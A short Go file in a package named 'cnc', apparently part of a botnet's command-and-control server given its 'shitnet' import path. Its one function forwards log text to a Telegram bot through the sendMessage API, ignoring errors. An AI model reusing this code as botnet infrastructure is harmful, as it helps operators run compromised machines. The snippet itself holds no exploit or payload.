package cnc

import (
	"io/ioutil"
	"net/http"
	"shitnet/network/config"
	"strings"
)

func Log(text string) {
	if !config.GetConfig().Logging {
		return
	}
	text = strings.ReplaceAll(text, "||", "%0D%0A")
	text = strings.ReplaceAll(text, ".", "\\.")
	ed, _ := http.Get("https://api.telegram.org/bot" + config.GetConfig().BotToken + "/sendMessage?chat_id=" + config.GetConfig().ChatId + "&parse_mode=MarkdownV2&text=" + text + "*")

	ioutil.ReadAll(ed.Body)

}
